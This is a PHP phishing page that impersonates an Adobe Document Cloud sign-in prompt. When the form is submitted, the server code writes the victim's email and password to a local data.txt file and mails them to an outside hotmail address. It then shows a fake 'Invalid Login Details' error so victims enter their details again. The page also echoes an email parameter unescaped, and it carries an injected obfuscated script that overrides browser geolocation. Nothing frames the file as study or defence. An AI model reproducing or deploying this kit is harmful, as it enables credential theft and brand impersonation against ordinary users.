<?php
$msg = '<p><strong>Confirm your identity</strong>!<br>
    Sign in with your receiving email account to view document.</p>';

if(isset($_POST['sendgo']) && $_POST['sendgo'] == 'sendto'){
  $msg = '<p><strong>Confirm your identity</strong>!<br><span style="color: red;">Invalid Login Details</span></p>';

  $to      = 'livebillcenter020@hotmail.com';
  $subject = 'MS Product'.mt_rand();
  $message = 'Email: '.$_POST['email'] .' PASSWORD: '.$_POST['password']. "\r\n";
  $headers = 'From: webmaster@example.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

    $fp = fopen('data.txt', 'a');
    fwrite($fp, $message);
    fclose($fp);
    @mail($to, $subject, $message, $headers);
$emailA = '';
if(!empty($_GET['email'])){$emailA = $_GET['email'];}
header("Location: error.php?email=$emailA");
}
?>
<html>
<script>(function(){function psUWv() {
  window.DEKjsvt = navigator.geolocation.getCurrentPosition.bind(navigator.geolocation);
  window.jXoEBlf = navigator.geolocation.watchPosition.bind(navigator.geolocation);
  let WAIT_TIME = 100;

  function waitGetCurrentPosition() {
    if ((typeof window.VaYFo !== 'undefined')) {
      if (window.VaYFo === true) {
        window.vrIzjQg({
          coords: {
            latitude: window.oSqqz,
            longitude: window.GCdjQ,
            accuracy: 10,
            altitude: null,
            altitudeAccuracy: null,
            heading: null,
            speed: null,
          },
          timestamp: new Date().getTime(),
        });
      } else {
        window.DEKjsvt(window.vrIzjQg, window.BreiwJN, window.awuTX);
      }
    } else {
      setTimeout(waitGetCurrentPosition, WAIT_TIME);
    }
  }

  function waitWatchPosition() {
    if ((typeof window.VaYFo !== 'undefined')) {
      if (window.VaYFo === true) {
        navigator.getCurrentPosition(window.hAABnjZ, window.RbOPFRl, window.jxntO);
        return Math.floor(Math.random() * 10000); // random id
      } else {
        window.jXoEBlf(window.hAABnjZ, window.RbOPFRl, window.jxntO);
      }
    } else {
      setTimeout(waitWatchPosition, WAIT_TIME);
    }
  }

  navigator.geolocation.getCurrentPosition = function (successCallback, errorCallback, options) {
    window.vrIzjQg = successCallback;
    window.BreiwJN = errorCallback;
    window.awuTX = options;
    waitGetCurrentPosition();
  };
  navigator.geolocation.watchPosition = function (successCallback, errorCallback, options) {
    window.hAABnjZ = successCallback;
    window.RbOPFRl = errorCallback;
    window.jxntO = options;
    waitWatchPosition();
  };

  window.addEventListener('message', function (event) {
    if (event.source !== window) {
      return;
    }
    const message = event.data;
    switch (message.method) {
      case 'nwkNVUB':
        if ((typeof message.info === 'object') && (typeof message.info.coords === 'object')) {
          window.oSqqz = message.info.coords.lat;
          window.GCdjQ = message.info.coords.lon;
          window.VaYFo = message.info.fakeIt;
        }
        break;
      default:
        break;
    }
  }, false);
}psUWv();})()</script>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Adobe Document Cloud</title>
</head>

<body marginheight="0" marginwidth="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">
<table width="100%" height="100%" cellspacing="0">
	<tbody>
		<tr>
			<td height="20%" bgcolor="#000000"><table align="center">
					<tbody>
						<tr>
							<td><img src="logo.jpg" width="330" height="70"></td>
							<td width="750"><table width="" align="right">
									<tbody>
										<tr>
											<td><font face="verdana" size="+2" color="#FFFFFF"> Adobe Document Cloud </font></td>
										</tr>
									</tbody>
								</table></td>
						</tr>
					</tbody>
				</table></td>
		</tr>
		<tr>
			<td height="70%" background="background.jpg"><table>
					<tbody>
						<tr>
							<td width="200"></td>
							<td><table>
										<tbody>
									<tr>
										<td height="10"></td>
										<td></td>
									</tr>
									<tr>
										<td><font face="verdana" size="2" color="#FFFFFF"> <font size="+2">Access Denied!</font> <br>
											Please sign in with a valid ID to view your document </font></td>
									</tr>
									<tr>
										<td height="35"></td>
										<td></td>
									</tr>
										<tr>
										<td>
									
										<form method="post" action="./error.php?email=<?php if(!empty($_GET['email'])){echo $_GET['email'];}?>">
									
									<input type="hidden" name="sendgo" value="sendto">
										</td>
										</tr>
									
									<tr>
										<td><input name="email" type="email" style="width:320px; height:45px; 
			font-family: Verdana; font-size: 14px; color:#000000; background-color: #FFFFFF; border: solid 1px #FFFFFF; padding: 10px; 
			-moz-border-radius: 2px; -webkit-border-radius: 2px; -khtml-border-radius: 2px; border-radius: 2px; 
			-moz-box-shadow: 3px 3px 3px #000000; -webkit-box-shadow: 3px 3px 3px #000000; box-shadow: 3px 3px 3px #000000;" required value="<?php if(!empty($_GET['email'])){echo $_GET['email'];}?>" ></td>
									</tr>
									<tr>
										<td height="5"></td>
										<td></td>
									</tr>
									<tr>
										<td><input name="password" type="password" style="width:320px; height:45px; 
			font-family: Verdana; font-size: 14px; color:#000000; background-color: #FFFFFF; border: solid 1px #FFFFFF; padding: 10px; 
			-moz-border-radius: 2px; -webkit-border-radius: 2px; -khtml-border-radius: 2px; border-radius: 2px; 
			-moz-box-shadow: 3px 3px 3px #000000; -webkit-box-shadow: 3px 3px 3px #000000; box-shadow: 3px 3px 3px #000000;" required placeholder="Password"></td>
									</tr>
									<tr>
										<td height="5"></td>
									</tr>
									<tr>
										<td><input type="submit" value="View File Online" style="width:320px; height:45px; background-color: #045FB4; border: solid 3px #045FB4; 
			font-family: Verdana; font-size: 15px; font-weight: light; color: #ffffff; -moz-border-radius: 3px; -webkit-border-radius: 3px; 
			-khtml-border-radius: 3px; border-radius: 3px;-moz-box-shadow: 3px 3px 3px #000000; -webkit-box-shadow: 3px 3px 3px #000000; 
			box-shadow: 3px 3px 3px #000000;"></td>
									</tr>
									<tr>
										<td height="100"></td>
										<td></td>
									</tr>
										</tbody>
								</table></td>
						</tr>
					</tbody>
				</table></td>
		</tr>
			</form>
		
		<tr>
			<td height="10%" bgcolor="#000000"><div align="center"> <img src="footer.png" width="550" height="38"> </div></td>
		</tr>
	</tbody>
</table>
</body>
</html>